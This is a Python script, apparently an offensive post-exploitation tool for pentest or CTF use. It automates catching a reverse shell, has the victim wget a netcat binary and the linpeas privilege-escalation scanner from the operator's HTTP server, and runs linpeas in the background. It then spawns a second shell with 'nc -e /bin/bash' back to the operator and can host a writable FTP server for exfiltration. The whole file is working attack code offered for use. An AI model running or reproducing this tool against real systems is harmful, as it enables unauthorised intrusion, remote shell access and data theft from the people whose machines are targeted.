#!/usr/bin/python3

from pwn import *
import argparse
import random
import threading
import socket
import fcntl
import struct
import logging
import colorlog


# Set up logging
logger = logging.getLogger(__name__)  # __name__ is the name of the current module
logger.setLevel(logging.DEBUG)  # set the logging level to DEBUG

formatter = colorlog.ColoredFormatter(
    '%(log_color)s%(levelname)s:%(message)s',
    log_colors={
        'DEBUG': 'cyan',
        'INFO': 'green',
        'WARNING': 'yellow',
        'ERROR': 'red',
        'CRITICAL': 'red,bg_white',
    }
)

handler = colorlog.StreamHandler()
handler.setFormatter(formatter)



def parse_args():
    parser = argparse.ArgumentParser()
    parser.add_argument("-p", "--port", help="Listen port for the reverse shell", type=int, default=4444)
    parser.add_argument("-lp", "--lport", help="Local port for the file server", type=int, default=9001)
    parser.add_argument("-i", "--interface", help="The interface to use", type=str, default="tun0")
    parser.add_argument("-d", "--dport", help="The port to use for data exfiltration",
                        type=int, default=None)
    parser.add_argument("-o", "--os", help="Currently not used", type=str, default="Linux")
    parser.add_argument("-v", "--verbose", help="Verbose output", action="store_true")
    parser.add_argument("-q", "--quiet", help="Quiet output", action="store_true")
    args = parser.parse_args()
    return args


def get_file(tmp_dir, ip, lport, p, filename):
    p.sendline(f"wget http://{ip}:{lport}/www/{filename} -O {tmp_dir}/{filename}".encode())
    p.sendline(f"chmod +x {tmp_dir}/{filename}".encode())


def reverse_shell_recon(tmp_dir, port, current_os, lport, ip, mport):
    p = process("/bin/bash")  # Spawns a process
    p.sendline(f"nc -lvnp {port}".encode())
    logger.info(f"[+] Reverse shell_recon listening on port {port}")
    needle = "connect to"
    # Wait for needle to appear in the output
    p.recvuntil(needle.encode())

    # Spawn the manual shell thread
    threading.Thread(target=manual_shell, args=(mport,)).start()

    p.sendline(f"mkdir {tmp_dir}".encode())
    get_file(tmp_dir, ip, lport, p, "nc")
    p.sendline(f"wget http://{ip}:{lport}/www/linpeas.sh -O {tmp_dir}/linpeas.sh".encode())
    p.sendline(f"chmod +x {tmp_dir}/linpeas.sh".encode())
    p.sendline(f"cd {tmp_dir}".encode())
    p.sendline(f"nohup ./linpeas.sh -w -q -s < /dev/null > linpeas.txt 2>&1 &".encode())
    # Linpeas will run in the background with the output redirected to a file and
    # input from /dev/null and errors redirected to stdout
    p.sendline(f"./nc {ip} {mport} -e /bin/bash".encode())
    exit()


def file_server(lport):
    p = process("/bin/bash")
    p.sendline(f"python3 -m http.server {lport}".encode())
    logger.info(f"[+] File server is listening on port {lport}")


def manual_shell(mport):
    p = process("/bin/bash")
    p.sendline(f"nc -lvnp {mport}".encode())
    logger.info(f"[+] Manual shell listening on port {mport}")
    needle = "connect to"
    # Wait for needle to appear in the output
    p.recvuntil(needle.encode())
    p.sendline("clear".encode())
    p.interactive()


# Function to get the IP address of the current machine
def get_ip_address(ifname):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    return socket.inet_ntoa(fcntl.ioctl(
        s.fileno(),
        0x8915,  # SIOCGIFADDR
        struct.pack('256s', ifname[:15].encode())
    )[20:24])


def checks(args):

    # Sudo check if -d is used
    if args.dport is not None:
        if os.geteuid() != 0 and args.dport < 1024:
            logger.error(f"[X] You need to have root privileges to run pyftpdlib on port {args.dport}.")
            return False
        else:
            logger.info(f"[+] FTP Server will run on port {args.dport}")

    # Check if linpeas is present
    if os.path.exists("./www/linpeas.sh"):
        logger.debug("[?] Linpeas is present in the www directory")

    else:
        logger.debug("[?] The linpeas script does not exist on the local machine")
        # Prompt the user to download the file
        download = input("[?] Do you want to download the file? /!\\ Might be outdated /!\\ (y/n):").strip()
        if download == 'y':
            # Download the file
            logger.info("[+] Downloading the file...")
            os.system("wget https://github.com/carlospolop/PEASS-ng/releases/download/20230219/linpeas.sh -O ./www/linpeas.sh")

        else:
            # Prompt to continue without linpeas
            continue_without_linpeas = input("[?] Do you want to continue without linpeas? (y/n): ").strip()
            if continue_without_linpeas == 'y':
                logger.info("[+] Continuing without linpeas")
            else:
                return False

    # Check if correct nc is present if not copy it and check if it is compatible
    if os.path.exists("./www/nc"):
        logger.debug("[?] The nc binary is in the www folder")
        logger.debug("[?] Make sure the nc has the -e option! As the script uses does not check for it!")
        # Nc is present compatability is not checked!
        return True

    else:
        logger.debug("[!] The nc is not in the www folder copying it from /bin/nc")
        logger.debug("[?] Make sure the nc has the -e option! As the script uses does not check for it!")
        os.system("cp /bin/nc ./www/nc")
        return True


# Function to start the ftp server if -d is used
def data_exfiltration(dport):
    p = process("/bin/bash")
    logger.info("[+] Starting the ftp server...")
    p.sendline("cd ./exfil".encode())
    p.sendline(f"python -m pyftpdlib -p {dport} --write".encode())


def main():

    print(r"""
             __         __
 /\    |_ _ (_ |_  _ |||  \ _      _
/--\|_||_(_)__)| )(-`|||__/(_)\/\/| )
    
    Version: 1.0.0
    Listener, File Hosting, and Exfiltration
    Author: Mario Vata
    
    """)

    # Parse the arguments
    args = parse_args()

    if args.verbose:
        logger.setLevel(logging.DEBUG)
    else:
        logger.setLevel(logging.INFO)

    if args.quiet:
        logger.setLevel(logging.CRITICAL)

    logger.addHandler(handler)

    # Check if the arguments are correct
    if not checks(args):
        logger.error("[X] Exiting...")
        exit()

    # Create a temporary directory
    tmp_dir = "/tmp/" + "".join(random.choices(string.ascii_uppercase + string.digits, k=10))
    # Print the temporary directory
    logger.info(f"[+] Temporary directory: {tmp_dir}")

    # Get the arguments
    lport = args.lport
    port = args.port
    mport = random.randint(1024, 65535)
    # Random port for the reverse shell that is not the same as the file server and burp
    while mport == port or mport == lport or mport == 8080:
        mport = random.randint(1024, 65535)
    current_os = args.os # Currently unused
    ip = get_ip_address("eth0")

    # 1. Spawn the reverse shell recon thread
    threading.Thread(target=reverse_shell_recon, args=(tmp_dir, port, current_os, lport, ip, mport)).start()
    # 2. Spawn the file server thread
    threading.Thread(target=file_server, args=(lport,)).start()
    # 3. Spawn the data exfiltration thread if -d is used
    if args.dport:
        threading.Thread(target=data_exfiltration, args=(args.dport,)).start()


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        logger.warning("[!] Exiting...")
        sys.exit(0)
    except SystemExit:
        raise
    except:
        logger.error("[X] Unexpected error:", sys.exc_info()[0])
        raise
